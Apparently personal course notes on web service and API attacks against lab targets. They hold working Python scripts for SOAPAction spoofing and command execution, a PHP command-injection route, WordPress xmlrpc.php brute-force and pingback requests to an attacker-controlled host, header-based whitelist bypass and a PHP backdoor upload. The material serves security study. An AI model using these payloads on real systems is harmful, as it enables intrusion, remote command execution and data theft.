# Web Service & API Attacks

## Introduction to Web Services and APIs

web services provide a standard means of interoperating between different software apps, running on different platforms and frameworks   
characterized by great interoperability and extensibility, as well as machine-processable descriptions with XML 

web services enable apps to communicate with teach other 

an application programming interface API is a set of rules that enables data transmission between different software   

### Web service vs. API 

some differences between the two are: 
- web services are a type of API, but the opposite is not always true 
- web services need a network to work, APIs can work offline 
- web services rarely allow external developer access while APIs often do 
- web services usually use SOAP for security and APIs can use many different designs like XML-rpc, JSON-rpc, SOAP, and REST
- web services usually use XML for data encoding and APIs can use different formats with the most popular being JSON 

### Web service approaches/technologies 

there are many approaches/technologies for providing and consuming web services 

XML-RPC = uses XML for encoding/decoding the remote procedure call RPC and the respective parameters. HTTP is usually transport of choice 

```http
  --> POST /RPC2 HTTP/1.0
  User-Agent: Frontier/5.1.2 (WinNT)
  Host: betty.userland.com
  Content-Type: text/xml
  Content-length: 181

  <?xml version="1.0"?>
  <methodCall>
    <methodName>examples.getStateName</methodName>
    <params>
       <param>
 		     <value><i4>41</i4></value>
 		     </param>
		  </params>
    </methodCall>

  <-- HTTP/1.1 200 OK
  Connection: close
  Content-Length: 158
  Content-Type: text/xml
  Date: Fri, 17 Jul 1998 19:55:08 GMT
  Server: UserLand Frontier/5.1.2-WinNT

  <?xml version="1.0"?>
  <methodResponse>
     <params>
        <param>
		      <value><string>South Dakota</string></value>
		      </param>
  	    </params>
   </methodResponse>
```

the payload is basically just a `<methodCall>` structure   
`<methodCall>` should contain a `<methodName>` sub-item that is related to the method to be called   
if the call requires parameters then `<methodCall>` must contain `<params>` sub-item 

JSON-RPC = use JSON to invoke functionality. HTTP is usually the transport of choice 

```http
  --> POST /ENDPOINT HTTP/1.1
   Host: ...
   Content-Type: application/json-rpc
   Content-Length: ...

  {"method": "sum", "params": {"a":3, "b":4}, "id":0}

  <-- HTTP/1.1 200 OK
   ...
   Content-Type: application/json-rpc

   {"result": 7, "error": null, "id": 0}

```

the `id` property contains an identifier established by the client, the server must reply with the same value in the response object if included 

Simple Object Access Protocol SOAP 

SOAP also uses XML but provides more functionalities than XML-RPC   
defines both a header structure and a payload structure   
header defines the actions that SOAP nodes are expected to take on the message, and the payload deals with the carried information   
web services declaration language WSDL is optional   
various lower-level protocols like HTTP can be used for transport   

anatomy of a SOAP message: 
- `soap:Evelope` = (required block) tag to differentiate between SOAP and normal XML. Requires a `namespace` attribute 
- `soap:Header` = (optional block) enables SOAP's extensibility through SOAP modules 
- `soap:Body` = (required block) contains the procedure, parameters, and data 
- `soap:Fault` = (optional block) used within `soap:Body` for error messages upon failed API call 

```http
  --> POST /Quotation HTTP/1.0
  Host: www.xyz.org
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
    xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
     SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

    <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotations">
       <m:GetQuotation>
         <m:QuotationsName>MiscroSoft</m:QuotationsName>
      </m:GetQuotation>
    </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>

  <-- HTTP/1.0 200 OK
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
   xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
    SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

  <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotation">
  	  <m:GetQuotationResponse>
  	     <m:Quotation>Here is the quotation</m:Quotation>
     </m:GetQuotationResponse>
   </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>

```

note that there are different SOAP envelopes but the anatomy will mostly be the same 

WS-BPEL web services business process execution language 
- essentially SOAP web services with more functionality for describing and invoking business processes 
- heavily resemble SOAP services 

RESTful representational state transfer 
- usually use XML or JSON 
- WSDL declaration are supported but uncommon 
- HTTP is transport of choice 
- HTTP verbs used to access/change/delete resources and use data 

```http
  --> POST /api/2.2/auth/signin HTTP/1.1
  HOST: my-server
  Content-Type:text/xml

  <tsRequest>
    <credentials name="administrator" password="passw0rd">
      <site contentUrl="" />
    </credentials>
  </tsRequest>
```

```http
  --> POST /api/2.2/auth/signin HTTP/1.1
  HOST: my-server
  Content-Type:application/json
  Accept:application/json

  {
   "credentials": {
     "name": "administrator",
    "password": "passw0rd",
    "site": {
      "contentUrl": ""
     }
    }
  }

```

similar API specifications/protocols exist like remote procedure call RPC, SOAP, REST, gRPC, GraphQL, etc. 

## Web Services Description Language (WSDL)

wsdl is an XML-based file exposed by web services that tells clients of the provided services/methods, including where they reside and the method-calling convention 

wsdl file should not always be accessible; either don't expose it or expose it through uncommon location   
directory or parameter fuzzing may reveal this if it is exposed 

for our target suppose we are using a SOAP service in `http://<target>:3002`   

we can do a basic directory fuzzing against the service with: 

`dirb http://<target>:3002`

we find `http://<target>:3002/wsdl` so lets try to make a curl request to it: 

![](Images/Pasted%20image%2020240307095348.png)

the response is empty but maybe there is a parameter that will provide us with access to the SOAP web service's WSDL   
we can use SecLists `burp-parameter-names.txt` to try to fuzz for parameters: 

`ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://10.129.202.133:3002/wsdl?FUZZ' -mc 200 -fs 0`

![](Images/Pasted%20image%2020240307095737.png)

we see that `wsdl` is a valid parameter so lets try to use it in a request: 

![](Images/Pasted%20image%2020240307095905.png)

note that wsdl files can be found in many forms like `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`   
DISCO is a microsoft technology for publishing and discovering web services 

### WSDL file breakdown 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/"
	xmlns:s="http://www.w3.org/2001/XMLSchema"
	xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/"
	xmlns:http="http://schemas.xmlsoap.org/wsdl/http/"
	xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/"
	xmlns:tns="http://tempuri.org/"
	xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"
	xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
	<wsdl:types>
		<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
			<s:element name="LoginRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
						<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="LoginResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandRequest">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
			<s:element name="ExecuteCommandResponse">
				<s:complexType>
					<s:sequence>
						<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
					</s:sequence>
				</s:complexType>
			</s:element>
		</s:schema>
	</wsdl:types>
	<!-- Login Messages -->
	<wsdl:message name="LoginSoapIn">
		<wsdl:part name="parameters" element="tns:LoginRequest"/>
	</wsdl:message>
	<wsdl:message name="LoginSoapOut">
		<wsdl:part name="parameters" element="tns:LoginResponse"/>
	</wsdl:message>
	<!-- ExecuteCommand Messages -->
	<wsdl:message name="ExecuteCommandSoapIn">
		<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
	</wsdl:message>
	<wsdl:message name="ExecuteCommandSoapOut">
		<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
	</wsdl:message>
	<wsdl:portType name="HacktheBoxSoapPort">
		<!-- Login Operaion | PORT -->
		<wsdl:operation name="Login">
			<wsdl:input message="tns:LoginSoapIn"/>
			<wsdl:output message="tns:LoginSoapOut"/>
		</wsdl:operation>
		<!-- ExecuteCommand Operation | PORT -->
		<wsdl:operation name="ExecuteCommand">
			<wsdl:input message="tns:ExecuteCommandSoapIn"/>
			<wsdl:output message="tns:ExecuteCommandSoapOut"/>
		</wsdl:operation>
	</wsdl:portType>
	<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
		<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
		<!-- SOAP Login Action -->
		<wsdl:operation name="Login">
			<soap:operation soapAction="Login" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
		<!-- SOAP ExecuteCommand Action -->
		<wsdl:operation name="ExecuteCommand">
			<soap:operation soapAction="ExecuteCommand" style="document"/>
			<wsdl:input>
				<soap:body use="literal"/>
			</wsdl:input>
			<wsdl:output>
				<soap:body use="literal"/>
			</wsdl:output>
		</wsdl:operation>
	</wsdl:binding>
	<wsdl:service name="HacktheboxService">
		<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
			<soap:address location="http://localhost:80/wsdl"/>
		</wsdl:port>
	</wsdl:service>
</wsdl:definitions>
```

the found WSDL file uses version 1.1 layout and has many elements: 
- definition - the root element of all WSDL files, Contains the name of the web service if specified, all namespaces used across the WSDL document are declared, and all other service elements are defined
- data types - to be used in the exchanged messages 
- messages - defines input and output operations that the web service supports. The messages to be exchanged are defined and presented either as an entire document or as arguments to be mapped to a method invocation 
- operation - defines available SOAP actions alongside the encoding of each message (like a programming method)
- port type - encapsulates every possible input and output message into an operation. Defines the web service, the available operations, and the exchanged messages. In WSDL 2.0 the interface element defines the available operations and it comes to messages the data types element handles defining them 
- binding - binds the operation to a particular port type. Think of bindings as interfaces. Client calls the relevant port type and uses the details given by the binding to be able to access the operations bound to this port type. Provides web services access details like the message format, operations, messages, and interfaces 
- service - client makes a call to the web service through the name of the specified service in the service tag. Client identifies the location of the web service 

## SOAPAction Spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters   
the operation resides in the first child element of the SOAP message's body   
if HTTP is the transport then it can use another HTTP header called `SOAPAction`, which contains the operation's name   
the app can identify the operation within the SOAP body through this header without parsing the XML  

if the service only considers the SOAPAction attribute when determining the operation to execute then it may be vulnerable to spoofing 

we can again find the WSDL file on our target: 

![](Images/Pasted%20image%2020240307154209.png)

we want to look at: 

```xml
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

this is a SOAPAction operation called `ExecuteCommand`, we can also look at its parameters: 

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

we can see that there is a `cmd` parameter   

lets make a python script to issue requests, this one will execute the `whoami` command: 

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

when we try to run this script we will get an error that the function is only allowed for internal networks: 

![](Images/Pasted%20image%2020240307154909.png)

we can try to get around this by performing a SOAPAction spoofing attack with a new script: 

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

in this script we instead specify the `LoginRequest` in the `<soap:Body>` so that our request goes through  
we then specify the parameters of `ExecuteCommand` because we want to have the SOAP service execute a `whoami` command   
in the `SOAPAction` header we can then use the `ExecuteCommand` operation   

if the web service determines the operation solely based on the `SOAPAction` header we might bypass the restrictions that the SOAP service has and execute our restricted operation   

we can run our new script and see that we get our command output: 

![](Images/Pasted%20image%2020240307155459.png)

you can also modify the script to send multiple commands: 

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

## Command Injection 

command injections against web services would allow system command execution directly on the back-end server   
if a web service uses user-controlled input to execute a system command then it is open to malicious payloads to subvert the intended command 

suppose we are assessing a connectivity-checking service on `http://<target>:3003/ping-server.php/ping`  

note that this example is not using the web service designs that we just covered, but rather it is more like a normal web service that provides functionality in a programmatic way 

```php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

a function called `ping()` is defined that takes in arguments `host_url_ip` and `packets`  
the request will look like: `http://<target>:3003/ping-server.php/ping/<VPN/TUN adapter IP>/3`  

you can make sure that this request is sending ping requests by capturing traffic with tcpdump: 

![](Images/Pasted%20image%2020240307150044.png)

![](Images/Pasted%20image%2020240307150053.png)

the code will also check to see if the packet value is more than 4 which if we issue a request for `/3333` we will get an error   

it will then define a `cmd` variable which forms the ping command to be executed   
the `packets` and `host_url` arguments are parsed and `escapeshellarg()` is used to safely escape the characters in the `host_url`   

the command is then executed with the `shell_exec()` function 

if the request method is GET then an existing function can be called with the help of `call_user_func_array()` which calls an existing PHP function by taking in a function to call followed by its arguments  
this means that we could use this to instead call our request to something like: 

`http://<target>:3003/ping-server.php/system/ls`

![](Images/Pasted%20image%2020240307152039.png)

## Attacking WordPress 'xmlrpc.php'

`xmlrpc.php` being enabled on a wordpress instance is not a vulnerability, but depending on the methods allowed it can give some enumeration and exploitation activities 

if we are assessing the security of `http://blog.inlanefreight.com` and through enumeration found the `admin` username and that `xmlrpc.php` is enabled   

we can then mount a password brute-force attack through `xmlrpc.php`: 

```shell
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

we knew that we could call this with `system.listMethods` and by going through the wordpress source code https://codex.wordpress.org/XML-RPC/system.listMethods and by interacting with the `xmlrpc.php`: 

```shell
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

![](Images/Pasted%20image%2020240307163034.png)

in the above list we can find `pingback.ping` which allows for XML-RPC pingbacks which is a comment that's created when you link to another blog post as long as the other blog is set to accept pingbacks 

if pingbacks are available the can facilitate: 
- ip disclosure - can call pingback.ping on a wordpress instance behind cloudfare to identify its public IP. The pingback will point to an attacker-controlled host like a VPS that will be accessible by a wordpress instance 
- cross-site port attack (XSPA) - can call pingback.ping against itself on different ports 
- DDoS - can call pingback.back on numerous wordpress instances against a single target 

as soon as the below request is sent, the attacker controlled host will receive a request (pingback) originating from the target site and exposing its public IP address: 

```http
--> POST /xmlrpc.php HTTP/1.1 
Host: blog.inlanefreight.com 
Connection: keep-alive 
Content-Length: 293

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://attacker-controlled-host.com/</string></value>
</param>
<param>
<value><string>https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/</string></value>
</param>
</params>
</methodCall>
```

## Information Disclosure (With a Twist of SQLi)

security related inefficiencies or misconfigs in a web service can result in info disclosure   
wen assessing a web service or an API we should spend a good amount of time fuzzing 

### Information disclosure through fuzzing 

suppose our target has an api on `http://<target>:3003`

we can first check to see if there are any parameters that might reveal the API's functionality   
lets try some parameter fuzzing: 

![](Images/Pasted%20image%2020240308154630.png)

we can see that the `id` parameter seems to be valid so lets check to see what the response is with a test value: 

![](Images/Pasted%20image%2020240308154723.png)

we can then use a python script to automate getting all the info that the API returns: 

```python
import requests, sys

def brute():
    try:
        value = range(10000)
        for val in value:
            url = sys.argv[1]
            r = requests.get(url + '/?id='+str(val))
            if "position" in r.text:
                print("Number found!", val)
                print(r.text)
    except IndexError:
        print("Enter a URL E.g.: http://<TARGET IP>:3003/")

brute()
```

this will try to brute force a range of 10000 id values to see which ones we get responses from  

note that if there is a rate limit set by the app we could always try to bypass it with headers like `X-Forwarded-For` and `X-Forwarded-IP`, etc. or use proxies 

these headers will need to be compared with an IP most of the time: 

```php
<?php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!(in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)))
{
    header("HTTP/1.1 401 Unauthorized");
}
else
{
  print("Hello Developer team! As you know, we are working on building a way for users to see website pages in real pages but behind our own Proxies!");
}
```

the issue in the above code is that it compares the `HTTP_X_FORWARDED_FOR` header to a possible whitelist but if it isn't set or is set without of the the IPs it will give a 401  
a bypass could be to set the header and the value to one of the IPs from the array 

### Information disclosure through SQL injection 

SQLi can affect APIs as well, in our example we can try submitting classic SQLi payloads in our parameter to see if we can find anything:

![](Images/Pasted%20image%2020240308163012.png)

![](Images/Pasted%20image%2020240308163033.png)

## Arbitrary File Upload

### PHP file upload via API to RCE 

our target will be on `http://<target>:3001`

we can see an anonymous file upload form: 

![](Images/Pasted%20image%2020240308170324.png)

lets try uploading a php backdoor file: 

![](Images/Pasted%20image%2020240308170342.png)

![](Images/Pasted%20image%2020240308170427.png)

this should allow us to use the `cmd` parameter in our request to execute code but this is only if we can determine where our uploaded file is located and if the file will be rendered successfully without any PHP function restrictions 

![](Images/Pasted%20image%2020240308170956.png)

the captured request shows us that the file was uploaded via a POST request to `api/upload`  
the content type was auto set to `application/x-php` which means there is no protection in place (would usually be set to `application/octet-stream` or `text/plain` if there were protections)  

we can then visit our uploaded file to execute our commands via the `cmd` parameter: 

![](Images/Pasted%20image%2020240308171435.png)

